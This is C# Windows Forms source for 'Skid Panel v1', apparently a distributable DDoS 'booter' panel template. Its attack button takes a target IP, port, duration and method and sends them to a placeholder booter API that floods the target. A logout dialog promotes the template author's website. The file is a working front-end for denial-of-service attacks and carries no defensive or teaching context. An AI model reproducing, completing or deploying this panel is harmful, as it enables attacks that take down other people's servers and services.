using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Net;

namespace SimplePanel
{
    public partial class MainHub : Form
    {
        public MainHub()
        {
            InitializeComponent();
        }
        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
            if (m.Msg == WM_NCHITTEST)
                m.Result = (IntPtr)(HT_CAPTION);
        }
        private const int WM_NCHITTEST = 0x84;
        private const int HT_CLIENT = 0x1;
        private const int HT_CAPTION = 0x2;

        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        private void close_btn_Click(object sender, EventArgs e)
        {
            this.Close();
            Environment.Exit(-1);
        }
        private void minimize_btn_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
        private void logout_btn_Click(object sender, EventArgs e)
        {
            DialogResult result = MessageBox.Show("Thanks For Using Skid Panel v1, Hope To See You Again\n\nPanel Template Made By $Exodus#4667\nhttps://reaper-services.ml/","Skid Panel v1",MessageBoxButtons.OK,MessageBoxIcon.Information);
            if(result == DialogResult.OK)
            {
                Process.Start("https://reaper-services.ml");
                Login loginHub = new Login();
                this.Hide();
                loginHub.ShowDialog();
                this.Close();               
            }
        }

        private void attack_btn_Click(object sender, EventArgs e)
        {
            StartAttack.RunWorkerAsync();        
        }

        private void StartAttack_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                CheckForIllegalCrossThreadCalls = false;
                string IP = ip_box.Text;
                string PORT = port_box.Text;
                string TIME = time_box.Text;
                string METHOD = method_box.Text;
                attack_logs.Items.Add($"IP: {IP}:{PORT}  |  Method: {METHOD}  |  Time: {TIME}s");
                WebClient wc = new WebClient { }; wc.DownloadStringTaskAsync($"http://ip/APINAME.php?key=yourfuckingkey&host={IP}&port={PORT}&method={METHOD}&time={TIME}");
            }
            catch
            {
                MessageBox.Show("Error Connecting To The API","Skid Panel - API Error",MessageBoxButtons.OK,MessageBoxIcon.Error);
            }
        }


        private void ip_box_Click(object sender, EventArgs e)
        {
            ip_box.Text = "";
        }

        private void port_box_Click(object sender, EventArgs e)
        {
            port_box.Text = "";
        }

        private void time_box_Click(object sender, EventArgs e)
        {
            time_box.Text = "";
        }
    }
}

